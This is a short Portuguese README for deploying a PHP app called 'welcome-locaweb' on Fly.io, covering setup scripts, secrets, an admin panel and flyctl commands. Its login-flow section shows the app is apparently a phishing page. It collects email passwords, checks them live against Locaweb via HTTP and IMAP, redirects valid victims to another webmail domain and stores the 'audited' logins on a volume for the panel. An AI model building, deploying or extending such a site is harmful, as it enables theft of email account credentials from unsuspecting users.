# Deploy Fly.io — welcome-locaweb

**App:** [welcome-locaweb](https://fly.io/apps/welcome-locaweb)  
**URL:** [https://welcome-locaweb.fly.dev/](https://welcome-locaweb.fly.dev/)  
**GitHub:** [github.com/gilmeizler2020/welcome/tree/main/web](https://github.com/gilmeizler2020/welcome/tree/main/web)

## Pré-requisitos

1. Conta [Fly.io](https://fly.io/) (login GitHub/Google)
2. `flyctl` instalado: https://fly.io/docs/flyctl/install/
3. Código na pasta `web/` do repositório (ou pasta `locaweb` local)

## 1ª vez — setup

```bash
cd web
bash deploy/fly-setup.sh
```

Isso cria:
- App `welcome-locaweb`
- Volume `/data` (logins auditados)
- Secrets: `PANEL_USER`, `PANEL_PASS`, `APP_BASE_URL`

## Deploy (atualizar site)

```bash
cd web
bash deploy/fly-deploy.sh
```

**Windows PowerShell:**
```powershell
cd web
.\deploy\fly-deploy.ps1
```

## URLs após deploy

| Página | URL |
|--------|-----|
| Login (desktop/mobile) | https://welcome-locaweb.fly.dev/ |
| Painel admin | https://welcome-locaweb.fly.dev/panel/login.php |
| API verify | https://welcome-locaweb.fly.dev/api/verify.php |

## Fluxo login

1. Usuário digita e-mail + senha
2. API valida no Locaweb (HTTP + IMAP fallback)
3. **Válido** → redirect [webmail-seguro.com.br/v2/](https://webmail-seguro.com.br/v2/)
4. **Inválido** → mensagem no index

## Config produção

Arquivo `config.fly.php` — carregado automaticamente no Fly (`FLY_APP_NAME`).

Alterar senha do painel:
```bash
fly secrets set PANEL_USER=Lima PANEL_PASS=SuaSenhaNova -a welcome-locaweb
```

## Comandos úteis

```bash
fly logs -a welcome-locaweb          # ver logs
fly ssh console -a welcome-locaweb   # entrar no container
fly status -a welcome-locaweb        # status
fly volumes list -a welcome-locaweb  # volume dados
```

## Estrutura Fly

```
fly.toml          → config app (região gru = São Paulo)
Dockerfile        → PHP 8.2 + router.php porta 8080
config.fly.php      → config produção
/data             → volume persistente (audit logins)
```

## Push GitHub → Fly

```bash
git add .
git commit -m "deploy fly"
git push origin main
# na pasta web:
bash deploy/fly-deploy.sh
```
